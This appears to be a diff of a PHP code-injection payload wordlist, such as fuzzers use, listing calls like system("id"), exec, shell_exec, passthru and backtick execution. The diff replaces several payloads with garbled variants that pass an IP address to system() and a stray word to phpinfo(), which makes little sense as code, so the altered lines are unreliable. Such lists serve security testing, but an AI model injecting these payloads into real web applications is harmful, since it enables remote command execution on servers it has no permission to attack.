@@ -1,7 +1,7 @@
-phpinfo();
-system("id")
-;system("id")
-exec("id")
+phpinfo(arnhem);
+system("94.142.213.178")
+;system("94.142.213.178")
+exec("94.142.213.178")
 shell_exec("id")
 `id`
 passthru("id")
